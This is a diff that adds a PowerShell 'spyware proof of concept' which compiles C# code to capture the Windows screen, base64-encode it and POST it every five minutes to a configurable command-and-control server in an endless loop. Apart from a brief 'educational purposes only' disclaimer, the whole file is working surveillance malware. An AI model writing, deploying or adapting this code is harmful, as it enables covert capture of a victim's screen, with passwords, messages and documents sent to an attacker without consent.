@@ -1,0 +1,80 @@
+# Windows Spyware PoC: Screenshot Capture
+# For educational purposes only. Test in a controlled, authorized lab environment.
+
+# Add .NET types for screenshot capture
+Add-Type -TypeDefinition @"
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+public class ScreenCapture {
+    public static string CaptureScreen() {
+        var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+        using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
+        using (var graphics = Graphics.FromImage(bitmap))
+        using (var memoryStream = new MemoryStream()) {
+            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            bitmap.Save(memoryStream, ImageFormat.Png);
+            return Convert.ToBase64String(memoryStream.ToArray());
+        }
+    }
+}
+"@ -ReferencedAssemblies System.Drawing, System.Windows.Forms
+
+# Configuration
+$C2Server = "http://192.168.1.21:8000"  # Replace with your C2 server IP/port
+$ScreenshotInterval = 300  # Seconds between screenshots (5 minutes)
+$LogFile = "C:\Temp\screenshot_spyware.log"  # Debug log file
+
+# Create log directory
+New-Item -Path C:\Temp -ItemType Directory -Force | Out-Null
+
+# Function to write debug logs
+function Write-Log {
+    param ([string]$Message)
+    Add-Content -Path $LogFile -Value "$(Get-Date): $Message"
+}
+
+# Function to send data to C2 server
+function Send-ToC2 {
+    param (
+        [string]$Endpoint,
+        [string]$Data,
+        [string]$ContentType = "application/octet-stream"
+    )
+    try {
+        Write-Log "Sending screenshot to $C2Server/$Endpoint"
+        Invoke-WebRequest -Uri "$C2Server/$Endpoint" -Method POST -Body $Data -ContentType $ContentType -ErrorAction Stop | Out-Null
+        Write-Log "Screenshot sent successfully"
+        return $true
+    } catch {
+        Write-Log "Failed to send screenshot: $_"
+        return $false
+    }
+}
+
+# Function to capture and send screenshot
+function Take-Screenshot {
+    try {
+        Write-Log "Capturing screenshot"
+        $base64Image = [ScreenCapture]::CaptureScreen()
+        Send-ToC2 -Endpoint "screenshot" -Data $base64Image
+    } catch {
+        Write-Log "Error capturing screenshot: $_"
+    }
+}
+
+# Main loop
+try {
+    Write-Log "Starting screenshot spyware"
+    $lastScreenshot = Get-Date
+    while ($true) {
+        if (((Get-Date) - $lastScreenshot).TotalSeconds -ge $ScreenshotInterval) {
+            Take-Screenshot
+            $lastScreenshot = Get-Date
+        }
+        Start-Sleep -Seconds 10  # Check every 10 seconds to reduce CPU usage
+    }
+} catch {
+    Write-Log "Main loop error: $_"
+}
